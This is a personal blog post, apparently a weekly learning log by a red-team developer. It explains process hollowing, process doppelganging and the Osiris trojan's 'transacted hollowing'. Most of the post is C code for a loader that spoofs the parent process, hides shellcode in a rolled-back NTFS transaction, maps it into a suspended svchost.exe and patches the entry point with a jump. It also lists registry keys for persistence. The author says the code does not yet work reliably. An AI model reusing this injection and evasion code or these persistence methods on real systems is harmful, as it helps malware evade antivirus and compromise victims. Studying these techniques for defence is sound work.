This week I continued working on the [PeloponneseanWarKit]() and my process injection journey took me to ancient Egypt and their gods.
<!--more-->

### 1. In with the new, out with the old

Last week I introduced the [PeloponneseanWarKit]() (yes I'm sticking with that name) and talked about persistence through registry keys. This week I added 2 additional registry keys that can be used for persistence:

* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon {UserInit}
* HKEY_CURRENT_USER\Environment {UserInitMprLogonScript}

Unfortunately I had to cut some losses in the payload department and remove the base64 encoding I introduced last week. Due to a lack of error handling payloads were incorrectly decoded and the overhead that is introduced with implementing error handling outscales the benefits for now. Payloads are still encrypted with a single byte XOR.

I have started development of a novel BOF that will use a hybrid combination of [process hollowing](https://attack.mitre.org/techniques/T1055/012/) and [process doppelganging](https://attack.mitre.org/techniques/T1055/013/) to inject a portable executable (PE) into a remote process.

### 2. Process Hollowing

[Process Hollowing](https://github.com/m0n0ph1/Process-Hollowing) is a fairly popular and common technique to hide malicious code in a seemingly innocent process. It leverages [Section Objects and Views](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views) to manipulate shared memory between 2 processes.

In my [Week 2](/2021/05/01/week-2.html) blogpost, I went over Virtual Address Space and how this is private for processes running in User Space, and shared for system processes in Kernel Space. However, this is not completely true. Processes can share part of their Virtual Address Space with other processes through a Section Object. Section Objects are also used by processes to map a file into its address space. For example, the different DLL's that are present in a process are mapped using a Section Object.

![mapped DLLs](/assets/images/file-mapping.png)

A Section Object by itself is just a region of memory and is invisible to a process, if a process wants to interact with the section, it needs a View. A view is essentially a window through which a process can see the section and it dictates the access rights a process has to the section. The act of creating a view for a section is known as *mapping* a view of the section.

When a process is started, it maps the base executable into its own memory as an **image**. There are different [types](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga) of mappings, `SEC_IMAGE` indicates that the file that is being mapped is an executable image file. In the example below *nslookup* maps `C:\Windows\System32\nslookup.exe` into its own address space as an **image**.

![mapped nslookup](/assets/images/nslookup-mapping.png)

The executable or image that is mapped, starts at a certain memory address also known as the **image base address**. In case of *nslookup* this address is `0x7ff7c78a0000`. The **image base address** is stored in a structure called the [Process Environment Block (PEB)](https://en.wikipedia.org/wiki/Process_Environment_Block), along various other process parameters, data structures, global context, and so on.

The idea behind Process Hollowing, is to spawn an innocent process in a suspended state, and use its **PEB** to locate the **image base address**. The image base address is then used to "carve out" or "hollow" the process by unmapping the image from its address space. Once the base image is unmapped, it is replaced by a new malicious image. If the image base of the new image does not match the image base of the old image, it needs to be rebased. Once this is done, the `EAX` (`RAX` on x64) register of the main suspended thread is set to the *entry point* of the new image, after which the process is resumed and the *entry point* of the new image is executed.

### 3. Process Doppelganging

[Process Doppelganging](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf) is a technique presented at [Blackhat Europe](https://blackhat.com) by [Tal Liberman](https://twitter.com/tal_liberman) and [Eugene Kogan](https://twitter.com/EuKogan) from enSilo (now Fortinet FortiEDR).

It tries to address some of the issues Process Hollowing has, like loading a file from disk, and using highly suspicious API calls like `NtUnmapViewOfSection`, `VirtualAllocEx` and `SetThreadContext`. It does this by using something called [Transactional NTFS](https://en.wikipedia.org/wiki/Transactional_NTFS). Transactions were introduced in Windows Vista and allow for write-file operations that are either guaranteed to succeed or fail completely.

A transaction is created with the `NtCreateTransaction` API call, this transaction is then used to open or create a clean file using `CreateFileTransacted`. Once the file is opened in the transaction, it is overwritten with a malicious payload using `NtWriteFile` and a new section is created from the transacted file (opposed to a file on disk when Process Hollowing) using `NtCreateSection`. With the section created and the malicious payload in memory, the file is no longer needed and is rolled back with `NtRollbackTransaction`. By rolling back the transaction, the file is never actually created or modified on disk, and cannot be accessed in the transaction by other processes including EDR/AV solutions.

The final step involves creating the new process and thread objects with `NtCreateProcessEx` and `NtCreateThreadEx`, creating the process parameters with `RtlCreateProcessParametersEx`, copying the parameters to the newly created process's address space and resuming execution.

### 4. Osiris, god of... malware?

> I was ~~in the library~~ on the internet the other night, ~~in~~ on the restricted section, and I read something rather odd, about a bit of rare ~~magic~~ malware. It's called, as I understand it, ~~a horcrux~~ [Osiris](https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/).

![horcrux](https://media.giphy.com/media/6HAvZnZJXpOG4/giphy.gif)

Osiris is a banking trojan from the [Kronos](https://en.wikipedia.org/wiki/Kronos_(malware)) family, which implements a unique hybrid of Process Hollowing and Process Doppelganging in its loader called **Transacted Hollowing**, to ultimately combine the best of both worlds.

Transacted Hollowing first spawns a new, innocent, suspended process from a legitimate executable. It maps a copy of the executable into its own process for later use when calculating offsets.

Next it uses transactions to create a new file containing the malicious payload, which in turn is used to create a new section, after which the transaction is rolled back.

It will then map the malicious section into the remote process as an additional module, thus not carving out and replacing the original image.

Finally the *entry point* of the original image is redirected and the PEB of the remote process is patched, then the process is resumed.

### 5. Rome wasn't built in a day

Naturally, if a professional blackhat malware author can write something cool like this, so can I. Right? Wrong. But I tried :)

Initially I thought there would be plenty of resources out there already of people adopting this novel technique, however I came up empty handed. I went as far as obtaining source code for a related piece of malware and a sample of Osiris itself to analyze, to base my work upon. Maybe I've overestimated my ability a little bit this time.

#### 1. Spawning a process and map a copy

Spawning a new suspended process is a trivial task at this point. I reused my code to enumerate running processes looking for *explorer.exe* and open a handle to it. This handle is used to spoof the parent process ID (PPID) of the newly spawned process.

```c
PROCESS_INFORMATION pi = Spawn("C:\\Windows\\System32\\svchost.exe -k netsvc -p -s UserManager", GetParentHandle("explorer.exe"));
```

Next I'll map a copy of *svchost.exe* in the current process.

```c
//<truncated for space>
RtlInitUnicodeString(&procFileName, (PCWSTR)L"\\??\\C:\\Windows\\System32\\svchost.exe");
RtlZeroMemory(&sb, sizeof(IO_STATUS_BLOCK));
InitializeObjectAttributes(&oat, &procFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

NtOpenFile(&hFile, FILE_GENERIC_READ, &oat, &sb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
//<truncated for space>
NtCreateSection(&hProcSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_COMMIT, hFile);
//<truncated for space>
NtMapViewOfSection(hProcSection, GetCurrentProcess(), &sectionaddr, 0, 0, NULL, &size, ViewUnmap, 0, PAGE_READONLY);

NtClose(hFile);
NtClose(hProcSection);
```

#### 2. Using transactions to create a malicious section

Instead of using the high level API `CreateFileTransactedW` to create the transacted file, I used a combination of two low level API's, `RtlSetCurrentTransaction` followed by `NtCreateFile`. I did a similar thing to write to the transacted file with `RtlSetCurrentTransaction` followed by `NtWriteFile`.

After the transacted file is created and the payload is written to it, I create a new section from the transacted file and rollback the transaction.

```c
//<truncated for space>
NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, 0, NULL);

RtlSetCurrentTransaction(hTransaction);
//<truncated for space>
RtlInitUnicodeString(&filename, (PCWSTR)L"\\??\\C:\\temp\\test.txt");

RtlZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
InitializeObjectAttributes(&oa, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);

NtCreateFile(&hFileTransacted, STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

RtlSetCurrentTransaction(hTransaction);
//<truncated for space>
RtlZeroMemory(&iosb, sizeof(IO_STATUS_BLOCK));
NtWriteFile(hFileTransacted, NULL, NULL, NULL, &iosb, shellcode, shellcode_size, NULL, NULL);
//<truncated for space>
NtCreateSection(&hSection, SECTION_MAP_EXECUTE, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFileTransacted);
NtClose(hFileTransacted);
NtRollbackTransaction(hTransaction, TRUE);
NtClose(hTransaction);
```

#### 3. Mapping the section

The newly created malicious section is then mapped into the remote process. The remote image base address `rBaseAddr` is set to Zero, this means that the operating system will decide where to map the image.

```c
LPVOID rBaseAddr = 0;
SIZE_T sSize = 0;
NtMapViewOfSection(hSection, pi.hProcess, &rBaseAddr, 0, shellcode_size, NULL, &sSize, ViewUnmap, 0, PAGE_EXECUTE);
```

#### 4. Grabbing offsets

This is the part where it starts to get wonky. Instead of using the locally mapped section of *svchost.exe*, I used `NtQueryInformationProcess` to get the base address of the remote PEB. Next I used `NtReadVirtualMemory` to read the remote PEB. Once I have access to the remote PEB, I can use it to read the remote image base address of *svchost.exe*.

With the remote image base address, I can use `NtReadVirtualMemory` again to read the image headers, which in turn are used to read the remote *entry point* address.

```c
PROCESS_BASIC_INFORMATION basicinfo;
ULONG bytesWritten = 0;
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &basicinfo, sizeof(PROCESS_BASIC_INFORMATION), &bytesWritten);

PEB peb = { 0 };
SIZE_T bytesRead = 0;
NtReadVirtualMemory(pi.hProcess, basicinfo.PebBaseAddress, &peb, sizeof(PEB), &bytesRead);

DWORD64 imageBase = (DWORD64)peb.ImageBaseAddress;

BYTE headersbuffer[4096];
NtReadVirtualMemory(pi.hProcess, (LPVOID)imageBase, headersbuffer, 4096, NULL);

PIMAGE_DOS_HEADER pDosH = (PIMAGE_DOS_HEADER)headersbuffer;
PIMAGE_NT_HEADERS pNtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersbuffer + pDosH->e_lfanew);
LPVOID rEntrypoint = (LPVOID)(imageBase + pNtH->OptionalHeader.AddressOfEntryPoint);
```

#### 5. Updating the entrypoint and patching the PEB

At this stage I'm experimenting, and let's just say my lab would have blown up multiple times by now if this was chemistry.

First I need to change the memory protection of the first 6 bytes of the remote *entry point*, they're set to **PAGE_EXECUTE_READ** by default and I will need **PAGE_READWRITE** access. I could also change protections to **PAGE_EXECUTE_READWRITE** but having an executable and writable memory block is extremely suspicious.

After changing the protections, I constuct a patch that will overwrite the remote image base address with a `JMP <offset>; RET;` instruction. 

|Opcode|Instruction|Description|
|---|---|---|
|0xE9|JMP|Jump near, relative, RIP = RIP + 32-bit displacement sign extended to 64-bits|
|0xC3|RET|Pops return address off stack, continues execution at that address|

The remote *entry point* address is then overwritten with the patch and memory protections are restored to **PAGE_EXECUTE_READ**.

```c
DWORD oldProtect;
SIZE_T bytesToChange = 6;
NtProtectVirtualMemory(pi.hProcess, &rEntrypoint, &bytesToChange, PAGE_READWRITE, &oldProtect);

char patch[6] = { 0 };
memcpy_s(patch, 1, "\xE9", 1);
DWORD jumpsize = rBaseAddr - rEntrypoint;
memcpy_s(patch + 1, 4, &jumpsize, 4);
memcpy_s(patch + 5, 1, "\xC3", 1);
bytesWritten = 0;
NtWriteVirtualMemory(pi.hProcess, rEntrypoint, patch, sizeof(patch), &bytesWritten);

DWORD oldOldProtect;
NtProtectVirtualMemory(pi.hProcess, &rEntrypoint, &bytesToChange, oldProtect, &oldOldProtect);
```

#### 6. Resuming the process

Finally, the process is resumed.

```c
NtResumeThread(pi.hThread, NULL);
```

### 6. Wrapping up

This week has been a lot of trial and error (mostly error let's be honest) and I realize I might have made things too hard for myself. It hasn't immediately resulted in any useful Beacon Object Files, but it did help me understand a lot more concepts and techniques. Afterall you learn most from making mistakes.
